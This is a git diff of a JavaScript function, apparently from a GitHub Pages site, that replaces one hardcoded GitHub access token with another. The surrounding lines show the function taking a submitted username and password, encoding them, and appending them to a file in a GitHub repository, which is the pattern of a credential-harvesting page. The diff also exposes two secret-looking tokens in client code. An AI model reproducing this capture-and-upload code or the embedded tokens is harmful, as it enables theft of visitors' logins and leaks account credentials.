@@ -7,7 +7,7 @@ async function saveToGitHub(event) {
     let newEntry = `Username: ${username}\nPassword: ${password}\n------------------------------------------------------------------\n`; // Define newEntry
     let encodedNewEntry = btoa(unescape(encodeURIComponent(newEntry))); // Fix Base64 encoding
 
-    let githubToken = "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"; // Secure input instead of hardcoding
+    let githubToken = "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"; // Secure input instead of hardcoding
     let repoOwner = "Psivasai970";
     let repoName = "Psivasai970.github.io";
     let filePath = "username.txt";
@@ -59,3 +59,4 @@ async function saveToGitHub(event) {
         alert("Error saving to GitHub: " + errorData.message);
     }
 }
+
